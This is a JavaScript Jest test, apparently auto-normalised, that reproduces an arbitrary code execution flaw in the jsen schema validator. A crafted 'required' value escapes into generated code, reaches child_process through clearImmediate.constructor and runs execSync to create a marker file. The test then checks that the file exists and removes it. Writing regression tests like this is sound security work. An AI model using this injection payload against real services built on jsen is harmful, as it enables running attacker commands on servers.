const v31 = () => {
    const v17 = expect.assertions(2);
    v17;
    const fs = require('fs');
    const jsen = require('jsen');
    const path = './jsen';
    file_exist = fs.existsSync(path);
    const v18 = expect(file_exist);
    const v19 = v18.toBe(false);
    v19;
    const v20 = {};
    v20.type = 'string';
    const v21 = {};
    v21.username = v20;
    const v22 = ['"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync(\'touch jsen\')+"'];
    const v23 = {
        type: 'object',
        properties: v21,
        required: v22
    };
    const v24 = JSON.stringify(v23);
    let schema = JSON.parse(v24);
    try {
        const validate = jsen(schema);
        const v25 = {};
        const v26 = validate(v25);
        v26;
    } catch (e) {
    }
    file_exist = fs.existsSync(path);
    const v27 = expect(file_exist);
    const v28 = v27.toBe(true);
    v28;
    const v29 = function (err) {
    };
    const v30 = fs.unlink(path, v29);
    v30;
};
const v32 = test('Arbitrary code execution in jsen', v31);
v32;